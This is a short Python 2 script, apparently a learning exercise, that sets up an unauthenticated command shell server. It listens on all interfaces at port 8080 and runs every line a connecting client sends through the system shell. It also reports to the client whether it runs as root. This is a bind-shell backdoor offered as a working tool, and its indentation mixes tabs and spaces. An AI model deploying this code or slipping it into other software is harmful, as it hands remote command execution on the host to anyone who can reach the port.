#Simple command shell server in python. nc from client.

import socket
import threading
import subprocess
import sys


bind_ip = "0.0.0.0"
bind_port = 8080


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((bind_ip, bind_port))

server.listen(5)

print "[+] Listening on %s:%d" % (bind_ip,bind_port)

def handle_client(client_socket):
    
    while True:
        #print "[+] Recieved: %s " % request
	#Check for Root user?
	if subprocess.check_output(["id", "-u"]).rstrip() is '0':
		client_socket.send("[BOO]#")
	else:        
        	client_socket.send("[BOO]$")
        buffer = ""
        while '\n' not in buffer:
            buffer += client_socket.recv(1024)
	    if 'exit' in buffer:
            	client_socket.close()
		return
            result = run_command(buffer)
            client_socket.send(result)
    client_socket.close()

def run_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True)
    except:
        result = "Failed to Execute Dude!!\n"
    return result


#def cmd_shell(cmd):


while True:
    client, addr = server.accept()

    print "[+] Accepted Connection from %s:%d " % (addr[0], addr[1])


    client_handler = threading.Thread(target = handle_client, args= (client, ))
    client_handler.start()
